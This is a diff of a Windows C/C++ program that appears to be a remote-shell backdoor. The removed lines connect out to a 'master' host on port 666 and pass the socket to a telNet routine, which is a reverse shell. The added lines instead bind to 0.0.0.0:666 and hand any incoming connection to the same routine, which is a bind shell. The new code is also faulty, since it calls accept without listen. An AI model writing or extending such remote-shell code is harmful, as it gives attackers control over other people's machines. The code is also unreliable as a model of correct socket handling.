@@ -29,19 +29,19 @@ int main(int argc, char** argv)
 
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
-    sockaddr_in destinfo;
+    sockaddr_in addressinfo;
     uint32_t mastersIP = findMastersIP();
+
     if (!mastersIP)
         return 1;
-    destinfo.sin_addr.s_addr = mastersIP;
-    destinfo.sin_port = htons(666);
-    destinfo.sin_family = AF_INET;
+    addressinfo.sin_addr.s_addr = inet_addr("0.0.0.0");
+    addressinfo.sin_port = htons(666);
+    addressinfo.sin_family = AF_INET;
 
     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (sockaddr*)&destinfo, sizeof destinfo);
-
-    if (!s)
+    bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo));
+    SOCKET master = accept(s, NULL, 0);
+    if (!s | !master)
         return 1;
-    telNet(s);
-
+    telNet(master);
 }
